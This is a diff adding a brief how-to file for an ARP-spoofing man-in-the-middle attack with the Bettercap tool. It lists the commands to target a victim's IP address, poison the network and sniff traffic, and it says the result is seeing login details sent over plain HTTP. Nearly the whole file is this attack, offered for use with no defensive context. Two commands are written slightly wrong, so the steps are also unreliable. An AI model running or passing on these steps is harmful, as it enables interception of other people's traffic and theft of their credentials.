@@ -1,0 +1,9 @@
+To use this you need to have "Bettercap" in your linux system and there we need to type the following commands:
+net.sniff on
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets "ip address of victim"
+arp.spoof.on
+net.sniff.on
+--------
+Now we can see the login information of most of the http websites 
